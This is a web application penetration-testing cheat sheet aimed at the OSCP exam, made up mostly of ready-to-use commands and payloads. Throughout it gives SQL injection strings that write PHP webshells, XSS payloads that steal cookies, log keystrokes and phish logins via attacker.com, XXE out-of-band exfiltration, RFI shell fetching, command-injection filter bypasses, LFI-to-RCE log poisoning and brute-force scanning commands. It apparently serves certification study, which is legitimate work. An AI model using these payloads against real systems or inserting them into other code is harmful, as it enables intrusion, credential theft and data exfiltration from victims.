# Web Application Testing Cheatsheet for OSCP

## Directory and File Enumeration

### Gobuster
```bash
# Basic directory scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# With custom user-agent
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -a "Mozilla/5.0"

# With authentication
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -U username -P password

# With custom cookies
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -c "PHPSESSID=1234567890abcdef"
```

### Feroxbuster
```bash
# Basic scan
feroxbuster -u http://target.com

# Recursive scan with depth
feroxbuster -u http://target.com -d 3

# With file extensions
feroxbuster -u http://target.com -x php,txt,html

# With wordlist
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Parallel scanning
feroxbuster -u http://target.com -t 100
```

### Dirsearch
```bash
# Basic scan
dirsearch -u http://target.com

# With extensions
dirsearch -u http://target.com -e php,html,js

# With wordlist
dirsearch -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Recursive scan
dirsearch -u http://target.com -r
```

## Web Proxies

### Burp Suite

#### Setup
1. Configure browser to use proxy (127.0.0.1:8080)
2. Install Burp CA certificate in browser
3. Set scope to target domain

#### Useful Features
- **Proxy**: Intercept and modify requests/responses
- **Repeater**: Modify and resend requests
- **Intruder**: Automated attacks
- **Scanner**: Identify vulnerabilities (Pro version)
- **Decoder**: Encode/decode data
- **Comparer**: Compare requests/responses

#### Common Operations
```
# Intercept a request
1. Enable intercept in Proxy tab
2. Make request in browser
3. Modify request in Burp
4. Forward request

# Send to Repeater
1. Right-click on request
2. Select "Send to Repeater"
3. Modify and send request

# Basic Intruder attack
1. Right-click on request
2. Select "Send to Intruder"
3. Clear positions (§)
4. Add position at injection point
5. Load payload list
6. Start attack
```

### OWASP ZAP

#### Setup
1. Configure browser to use proxy (localhost:8080)
2. Install ZAP CA certificate in browser

#### Useful Features
- **Automated Scan**: Quick vulnerability assessment
- **Spider**: Discover site content
- **Active Scan**: Test for vulnerabilities
- **Fuzzer**: Test parameter values
- **Proxy**: Intercept and modify requests

#### Common Operations
```
# Quick scan
1. Enter target URL
2. Right-click > "Attack" > "Active Scan"

# Manual exploration
1. Enable proxy
2. Browse target application
3. Review site map

# Spider scan
1. Right-click on target
2. Select "Spider"
3. Configure options and start
```

## SQL Injection

### SQLMap

#### Basic Usage
```bash
# Test a parameter in a GET request
sqlmap -u "http://target.com/page.php?id=1"

# Test a parameter in a POST request
sqlmap -u "http://target.com/page.php" --data="id=1"

# Test with cookies
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=1234567890abcdef"

# Test with custom headers
sqlmap -u "http://target.com/page.php" --headers="User-Agent: Mozilla/5.0\nReferer: http://target.com"
```

#### Database Enumeration
```bash
# Get databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Get tables from a database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Get columns from a table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Dump data from a table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump
```

#### Advanced Options
```bash
# Use a specific technique
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Get OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Get database shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell

# File read/write
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Manual SQL Injection

#### Detection
```
# Test for errors
page.php?id=1'
page.php?id=1"
page.php?id=1 AND 1=1
page.php?id=1 AND 1=2

# Boolean-based
page.php?id=1 AND 1=1 -- -
page.php?id=1 AND 1=2 -- -

# Time-based
page.php?id=1 AND SLEEP(5) -- -
page.php?id=1; WAITFOR DELAY '0:0:5' -- -
```

#### Exploitation (MySQL)
```
# Union-based
page.php?id=-1 UNION SELECT 1,2,3 -- -
page.php?id=-1 UNION SELECT 1,database(),3 -- -
page.php?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='database_name' -- -
page.php?id=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' -- -
page.php?id=-1 UNION SELECT 1,username,password FROM users -- -

# Reading files
page.php?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 -- -

# Writing files
page.php?id=-1 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php' -- -
```

## Cross-Site Scripting (XSS)

### Detection
```
# Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

### Exploitation
```
# Cookie stealing
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>

# Keylogging
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key='+String.fromCharCode(e.which))
}
</script>

# Phishing
<script>
document.body.innerHTML='<div class="login">'+
'<h2>Session expired</h2>'+
'<form action="http://attacker.com/phish">'+
'Username: <input type="text" name="username"><br>'+
'Password: <input type="password" name="password"><br>'+
'<input type="submit" value="Login">'+
'</form></div>';
</script>
```

## File Upload Vulnerabilities

### Bypass Techniques
```
# Extension bypasses
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg (Null byte - PHP < 5.3)
shell.phtml
shell.php5
shell.shtml
shell.pHp

# Content-Type bypasses
Change Content-Type to image/jpeg or image/png in request

# File content bypasses
Add GIF header: GIF89a; to the beginning of the file

# .htaccess trick
Upload .htaccess file with:
AddType application/x-httpd-php .jpg
```

### Webshells
```php
// PHP one-liner
<?php system($_GET['cmd']); ?>

// More advanced PHP shell
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>

// PHP file upload
<?php
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded!";
}
?>
<form enctype="multipart/form-data" method="post">
<input type="file" name="file">
<input type="submit" value="Upload">
</form>
```

## Local File Inclusion (LFI)

### Detection
```
page.php?file=../../../etc/passwd
page.php?file=../../../windows/win.ini
page.php?file=/etc/passwd
page.php?file=C:\windows\win.ini
```

### Bypassing Filters
```
# Double encoding
page.php?file=%252e%252e%252fetc%252fpasswd

# Path truncation (PHP < 5.3)
page.php?file=../../../../../../../../../etc/passwd.......................

# Null byte (PHP < 5.3)
page.php?file=../../../etc/passwd%00

# Using wrappers
page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2BCg%3D%3D
page.php?file=expect://ls
```

### LFI to RCE
```
# Via log poisoning (Apache)
1. Send request with User-Agent: <?php system($_GET['cmd']); ?>
2. Access log file: page.php?file=../../../var/log/apache2/access.log&cmd=id

# Via PHP sessions
1. Set PHPSESSID cookie with value: <?php system($_GET['cmd']); ?>
2. Access session file: page.php?file=../../../var/lib/php/sessions/sess_[PHPSESSID]&cmd=id

# Via /proc/self/environ
1. Send request with User-Agent: <?php system($_GET['cmd']); ?>
2. Access environ: page.php?file=../../../proc/self/environ&cmd=id
```

## Remote File Inclusion (RFI)

### Detection
```
page.php?file=http://attacker.com/shell.txt
page.php?file=\\attacker.com\share\shell.txt
```

### Exploitation
```
# Host malicious file
1. Create shell.txt with: <?php system($_GET['cmd']); ?>
2. Host it on your server
3. Access: page.php?file=http://attacker.com/shell.txt&cmd=id

# Using SMB share (Windows targets)
1. Create shell.txt with: <?php system($_GET['cmd']); ?>
2. Host SMB share: impacket-smbserver share .
3. Access: page.php?file=\\10.10.14.1\share\shell.txt&cmd=id
```

## Command Injection

### Detection
```
# Basic tests
param=ls
param=;ls
param=`ls`
param=$(ls)
param=|ls
param=||ls
param=&ls
param=&&ls

# Blind tests
param=ping -c 4 10.10.14.1
param=`sleep 5`
param=$(sleep 5)
param=| sleep 5
```

### Bypassing Filters
```
# Space bypasses
param=cat${IFS}/etc/passwd
param=cat<>/etc/passwd
param=cat$IFS/etc/passwd

# Character bypasses
param=c'a't /etc/passwd
param=c"a"t /etc/passwd
param=c\at /etc/passwd
param=$'\x63\x61\x74' /etc/passwd

# Command substitution
param=$(c$()at /etc/passwd)
param=`c$()`at /etc/passwd`
```

## Server-Side Request Forgery (SSRF)

### Detection
```
# Basic tests
param=http://localhost
param=http://127.0.0.1
param=http://[::1]

# Internal services
param=http://127.0.0.1:22
param=http://127.0.0.1:3306
param=http://127.0.0.1:6379
```

### Bypassing Filters
```
# Alternative representations
param=http://0
param=http://0.0.0.0
param=http://127.1
param=http://2130706433 (decimal IP)
param=http://0x7f000001 (hex IP)

# Using redirects
1. Set up redirect: http://attacker.com/redirect -> http://127.0.0.1
2. param=http://attacker.com/redirect
```

## XML External Entity (XXE)

### Detection
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Exploitation
```xml
# File read
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

# SSRF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://internal-service:8080">
]>
<root>&xxe;</root>

# Out-of-band data exfiltration
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<root>&send;</root>

# Content of evil.dtd
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

## CMS Scanning

### WordPress
```bash
# WPScan basic usage
wpscan --url http://target.com/wordpress

# Enumerate users
wpscan --url http://target.com/wordpress --enumerate u

# Enumerate vulnerable plugins
wpscan --url http://target.com/wordpress --enumerate vp

# Brute force login
wpscan --url http://target.com/wordpress --passwords wordlist.txt --usernames admin
```

### Joomla
```bash
# Joomscan basic usage
joomscan -u http://target.com

# With proxy
joomscan -u http://target.com --proxy http://127.0.0.1:8080
```

### Drupal
```bash
# Droopescan basic usage
droopescan scan drupal -u http://target.com

# With proxy
droopescan scan drupal -u http://target.com --proxy http://127.0.0.1:8080
```

## OSCP Tips for Web Application Testing

1. **Methodology is Key**: Follow a structured approach for each web application
   - Map the application (directories, files, functionality)
   - Identify entry points (parameters, forms, APIs)
   - Test each entry point for vulnerabilities
   - Exploit vulnerabilities to gain access

2. **Manual Testing First**: Understand how the application works before using automated tools

3. **Document Everything**: Keep detailed notes of your findings and methodology

4. **Combine Tools**: Use multiple tools to validate findings and avoid false positives

5. **Focus on High-Value Targets**:
   - Admin panels
   - File upload functionality
   - User authentication
   - Input fields that interact with the backend

6. **Common Vulnerabilities to Look For**:
   - SQL Injection
   - Command Injection
   - File Inclusion
   - File Upload Vulnerabilities
   - Authentication Bypasses
   - Insecure Direct Object References

7. **Post-Exploitation**: After gaining initial access, look for:
   - Configuration files with credentials
   - Database connection strings
   - API keys
   - User session information

8. **Time Management**: Don't spend too much time on a single vulnerability; move on if stuck

9. **Privilege Escalation**: Web application compromises often lead to limited shell access; be prepared to escalate privileges

10. **Report Writing**: Document your findings clearly with steps to reproduce for the OSCP report
